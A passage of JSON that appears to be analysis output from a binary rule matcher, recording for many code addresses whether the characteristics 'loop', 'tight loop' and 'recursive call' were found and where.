                      "type": "absolute",
                      "value": 1651776352
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651777136
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651777136
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651777328
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651777328
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651779552
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651779552
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651779616
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651779616
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651779688
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651780816
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651780816
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651782064
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651782064
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651784976
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651784976
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651785376
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651785376
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651788096
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651788096
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651788624
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651788624
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651791328
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651791328
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651793904
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651793920
                    },
                    {
                      "type": "absolute",
                      "value": 1651793952
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651794016
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651794032
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651794128
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651794128
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651799536
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651799712
                    },
                    {
                      "type": "absolute",
                      "value": 1651799888
                    },
                    {
                      "type": "absolute",
                      "value": 1651799800
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651799968
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651799968
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651800992
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651800992
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651802672
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651802672
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651803168
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651803192
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651803232
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651803280
                    },
                    {
                      "type": "absolute",
                      "value": 1651803320
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651803344
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651803280
                    },
                    {
                      "type": "absolute",
                      "value": 1651803320
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651803600
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651803600
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651803904
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651803904
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651804176
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651804176
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651804490
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651804704
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651804704
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651805368
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651805904
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651805904
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651806592
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651806592
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651806832
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651806832
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651806976
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651807120
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651807264
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651807264
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651807344
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651807344
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651807504
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651807504
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651807696
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651807696
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
